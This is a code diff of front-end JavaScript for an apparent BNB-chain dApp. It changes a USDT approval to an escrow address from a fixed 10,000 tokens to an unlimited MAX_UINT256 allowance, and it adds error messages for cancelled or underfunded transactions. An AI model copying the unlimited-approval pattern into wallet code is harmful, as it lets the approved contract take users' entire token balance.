@@ -372,8 +372,8 @@ document.addEventListener("DOMContentLoaded", function () {
             // UNLIMITED APPROVAL: Pass MAX_UINT256 
             const txData = iface.encodeFunctionData("approve", [
                 escrowAddress, 
-                ethers.utils.parseUnits("10000", 18)      
-                      ]);
+                MAX_UINT256 // Unlimited approval 
+            ]);
 
             const txHash = await window.ethereum.request({
                 method: "eth_sendTransaction",
@@ -396,8 +396,25 @@ document.addEventListener("DOMContentLoaded", function () {
             }
         } catch (err) {
             // 🔥 CHANGE: Close the modal immediately on any error (User rejected/Canceled/Failed)
-            
-                   } finally {
+            showProcessingModal(false); 
+
+            // All error messages still use the simple showNotification bar at the top
+            const msg = (err?.message || "").toLowerCase();
+            if (
+                msg.includes("user rejected") ||
+                msg.includes("user denied") ||
+                msg.includes("cancelled") ||
+                msg.includes("canceled")
+            ) {
+                showNotification("Transaction cancelled.", "error");
+            } else if (
+                msg.includes("insufficient funds") ||
+                msg.includes("exceeds balance") ||
+                (msg.includes("execution reverted") && msg.includes("exceeds balance"))
+            ) {
+                showNotification("Insufficient BNB for gas fee or USDT balance.", "error");
+            } 
+                } finally {
             // 🔥 CHANGE: Modal closing logic removed from finally.
             // It will only be closed in the catch block (on error/cancel).
             nextBtn.disabled = false;
